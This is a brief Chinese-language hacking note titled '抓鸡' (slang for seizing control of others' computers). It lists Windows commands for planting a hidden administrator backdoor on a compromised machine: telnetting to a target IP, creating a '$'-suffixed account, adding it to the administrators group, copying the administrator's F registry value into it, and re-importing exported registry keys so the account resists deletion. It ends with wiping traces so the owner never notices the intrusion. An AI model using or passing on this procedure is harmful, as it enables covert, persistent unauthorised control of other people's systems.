# 抓鸡 #

#### 添加隐藏用户： ####

连接用户：
>telnet 192.168.1.9  [端口号]

创建用户：name$ ，密码为：123 ,$ 用于隐藏
>net user name 123 /add

添加用户至 administrator 分组
>net localgroup administrators name$ /add 

打开注册表
>regedit

查看对应关系，找到administrator 管理员的 F 复制到新建的用户 F里
>![](https://i.imgur.com/dDyYxqF.png)

导出用户和用户所属的文件

删除用户
>net user name$ /del

双击导出的文件

这么做 用户在输入 net user name$ /del 时候删除不了

扫尾：彻底删除没用的文件

做这个是为了让别人发现不了，像没来过一样
>![](https://i.imgur.com/pfPe6fA.png)


---------------------------------

